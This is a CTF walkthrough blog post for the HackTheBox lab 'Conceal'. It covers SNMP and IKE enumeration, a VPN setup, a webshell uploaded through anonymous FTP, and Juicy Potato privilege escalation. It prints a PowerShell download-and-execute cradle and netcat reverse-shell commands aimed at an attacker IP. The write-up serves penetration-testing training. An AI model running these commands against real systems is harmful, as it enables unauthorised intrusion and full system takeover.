<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Conceal HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/conceal-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-06T07:51:03+00:00">January 6, 2021</time><time class="updated" datetime="2025-06-27T11:13:46+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<strong>Conceal</strong>“. It’s available at HackTheBox for penetration testing practice. This laboratory is of a difficult level, but with adequate basic knowledge to break the laboratories and if we pay attention to all the details we find during the examination it will not be complicated. The credit for making this lab goes to <strong>bashlogic</strong>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Hard</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the <strong>HackTheBox</strong> website.</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Snmpwalk</span></li>
<li><span style="color: #000000;">Ike-scan</span></li>
<li><span style="color: #000000;">Strongswan</span></li>
<li><span style="color: #000000;">Dirsearch</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of write permission in FTP service </span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of permission in SeImpersonatePrivilege in the system</span></li>
</ul>
<ul>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Reconnaissance</span></h3>
<p><span style="color: #000000;">This time, the recognition be hard with nmap tool. We will use the next command to obtain the result of the UDP ports.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sU -sV -vvv --top-ports 20 -T5 --max-retries 0 conceal.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QMh7pUEJHqs/X_VfrMStHOI/AAAAAAAAsbc/MSeQhuf0zQsYFyg84isATPts2LtfBQPpwCLcBGAsYHQ/s16000/1.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Firstly, we will enumerate the <strong>UDP</strong> ports <strong>161</strong> and <strong>500</strong>. We will use the <strong>snmpwalk</strong> tool with the public channel. Then, we found a <strong>hashed password</strong> for <strong>IKE VPN</strong>, this is nice, we have open port 500 UDP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmpwalk -v 2c -c public conceal.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Cj7Kj61P1ls/X_Vf1l-NydI/AAAAAAAAsbg/fXj4oLl2Bps4YxjvqKPU1WdWsZfU7XqawCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">We will use the next command for <strong>enumerating users</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmpwalk -v 2c -public conceal 1.3.6.1.4.1.77.1.2.25</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7VpPSR7Iw3Y/X_Vf--hL3wI/AAAAAAAAsbo/X0OcZ3k34Bw-KMVmz3OQICfDblJjFjEKgCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">We will use this command <strong>for enumerating open ports</strong> in the localhost.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmpwalk -v 2c -c public conceal.htb 1.3.6.1.2.1.6.13.1.3</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JmVtLYtxfdg/X_VgEBhPKXI/AAAAAAAAsbs/Gmzc1xkBIKcIfysBRJaGVjiNS-E22XFnwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Then, we will use the <strong>ike-scan</strong> tool to obtaining information on the configuration software IKE VPN.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ike-scan -M conceal.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sfrFCwQlwfI/X_VgMD9G_2I/AAAAAAAAsb0/t9pXjlIy4a0bMnPWkRxWMjKqnWTnysLxwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We will back with password hashed and we use the website <span style="color: #0000ff;"><strong>hashes.com</strong></span> for cracking.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wi0TiIzMqso/X_VgYlerH3I/AAAAAAAAsb8/xr6StfGdIIwt8Fp9VdAvtSLiaHBuoWehgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Now, we install <strong>strongswan</strong> software and we edit the <strong>“/etc/ipsec.conf</strong>” with this configuration:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/ipsec.conf | tail -n 18</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NOCiizzxYcs/X_VgmyhJ8jI/AAAAAAAAscE/VX33UOJoo0A6YvkfE3aCOsHoxLk-hteEACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Also, we configure the file “<strong>/etc/ipsec.secrets</strong>” with our <strong>IP Address</strong> and <strong>password</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/ipsec.secrets | tail -n 18</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VGIM9LXpLJI/X_VgsmqqbhI/AAAAAAAAscI/RIlklzok2dMMeYEMhw2KDHg7KxwSuBM1gCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Now, we run <strong>strongswan</strong> with our configuration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ipsec start &amp;&amp; ipsec up conceal | tail -n 4</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YSFre5pcm_o/X_Vg4bR6gNI/AAAAAAAAscQ/s6M_BLoU_Tom_6BCmQfhQHkyHyLU85M3ACLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">We use <strong>nmap</strong> tool and now yes enumerate ports. (yes, see view how status “<strong>filtered</strong>“)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -Pn -sC -sV -n -p21,80,135,139,445 conceal.htb -oN conceal.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W9Ai-jvoO7A/X_Vg_NgHV9I/AAAAAAAAscU/EQseGBl6y1M46ywKhgp4T178Q6Vn7gVegCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">I have a script for portscan in bash scripting, I use for testing open ports.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">#!/bin/bash
for port in $(seq 1 65535); do
timeout 1 bash -c "&lt; /dev/tcp/$1/$port" 2&gt;/dev/null &amp;&amp; echo "[+] Port $port - OPEN" &amp;
done; wait</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-x-e4NTgoPYs/X_VhCgIiP2I/AAAAAAAAscY/-L_ltVEDovY8hYxMIwKCGrFbkZNU1g9XgCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">We also enumerate Microsoft IIS on the server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hz0aK39m16k/X_VhHI8-yvI/AAAAAAAAscc/LYwMl_53ihAH9tXGsitxPEDqOOim1YI7gCLcBGAsYHQ/s16000/12.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">We ignore SMB service and we use the <strong>FTP service</strong>, we can connect with user “<strong>anonymous</strong>” and we have the permission of write.</span></p>
<p><span style="color: #000000;">We upload the file “<strong>cmd.aspx</strong>“, this is a webshell for executing commands.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yhn-uodOWvY/X_VhOpKXiDI/AAAAAAAAsco/fOj5P440PB4ymDPbO_vpukzFPlzt8w4CQCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Now have problem… Where is this file? xD </span><span style="color: #000000;">We use <strong>dirsearch</strong> tool for enumerating directories and we a directory with the name “<strong>upload</strong>“.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirsearch -u http://conceal.htb -e “” -x 403 | tee dirsearch.log</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xQYKzcs2UlA/X_VhTGUEyQI/AAAAAAAAscw/dYuXY8E9Jdk4prB77VViA4fdptpVcuwiQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Wow! We found file!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AzccxgHHgtE/X_VhZZmBSCI/AAAAAAAAsc0/wiTyocyGss8G1JsJQojEv1vishJcns4rgCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">WTF?? It doesn’t work! We tested with other files also but doesn’t work.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0NDUaSr9VR0/X_Vhd51fTYI/AAAAAAAAsc4/VZS-Du7S6PwVf4d8KsXMxdir-SzI5RJkACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">We searching others webshell in <strong>ASP language</strong> and we found this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp">webshell</a></strong></span>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RCD4NYq9xDA/X_VhlP_d9tI/AAAAAAAAsdE/9BIqB0VfN3wytMOcUG7k1sphXqYSn1FegCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Okey! Now we execute a reverse shell in <strong>Powershell</strong> of <strong><a style="color: #000000;" href="https://github.com/samratashok/nishang">Nishang</a></strong>, we will put a python server with we reverse shell, A <strong>netcat</strong> in listen and we execute this command for webshell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Payload: powershell iex (New-Object Net.WebClient).DownloadString('http://IP/m3.ps1');</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qomyy978KnI/X_VhptE0o6I/AAAAAAAAsdM/hXeGI6qB_dMmNt5msmj1WUqqNZeuVyJxQCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">Yeah! We are in!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yG8tx6-uWIA/X_VhtKS8J3I/AAAAAAAAsdQ/wevRMJQGtvcdvIqwO7XulKd_izr0f40VQCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We read the file proof.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-avQAAywyjVA/X_VhxchTx5I/AAAAAAAAsdY/RtBi8Bolsiks1pgOYVmDbrTQn3DiyolLwCLcBGAsYHQ/s16000/20.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation (Administrator)</span></h3>
<p><span style="color: #000000;">Firstly, we execute the command “<strong>whoami /all</strong>” and we found permission with privilege “<strong>SeImpersonatePrivilege</strong>“.</span></p>
<p><span style="color: #000000;">This privilege is possible exploiting with “<strong>Juicy Potato</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tkwxDmYhNYE/X_Vh4kp20TI/AAAAAAAAsdc/_Jb8_Y8qxscx-sjlzXQosYsxA-o5BvZ4wCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">We execute command “<strong>systeminfo</strong>” and we enumerate Windows version for use <strong>CLSID</strong> correct. (<a style="color: #000000;" href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise"><span style="color: #0000ff;"><strong>Here the list CLSID</strong></span></a>)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WRjGx8HlVDY/X_Vh9Kpsd-I/AAAAAAAAsdk/VsVER0qVla4o2jfnzmHU8JVDsVFO6irhgCLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">We found a problem, It does not work correctly with nishang reverse shell. We use <strong>netcat</strong> in another terminal.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\nc.exe -e cmd.exe 10.10.XX.XX 4444</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TXGaV708JOs/X_ViESHvPCI/AAAAAAAAsds/0u5rWRUEcf0aGypB5FGL_ZjAive9AViRgCLcBGAsYHQ/s16000/23.png"/></span></p>
<p><span style="color: #000000;">Then, we use the binary “<strong>JuicyPotato.exe</strong>” executed with other cmd.exe in the port <strong>5555</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">JuicyPotato.exe -l 9999 -p c:\windows\system32\cmd.exe -a "/c c:\users\Destitute\videos\nc.exe -e cmd.exe 10.10.XX.XX 5555" -t * -c {CLSID}</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tqD6fiszaD8/X_ViIqXxICI/AAAAAAAAsd0/z2cCHvMe7MsC1piWQ9NdfSimQfnm3OT7ACLcBGAsYHQ/s16000/24.png"/></span></p>
<p><span style="color: #000000;">Finally, we have a <strong>netcat</strong> in listen and we received reverse shell as <strong>administrator</strong> (nt authority\sytem). We can read the root flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XYL8lWMKPI0/X_ViOoZssqI/AAAAAAAAsd4/r3Q3bFXXbPg3UHXvGVJuMXYwZZYjD_HNQCLcBGAsYHQ/s16000/25.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
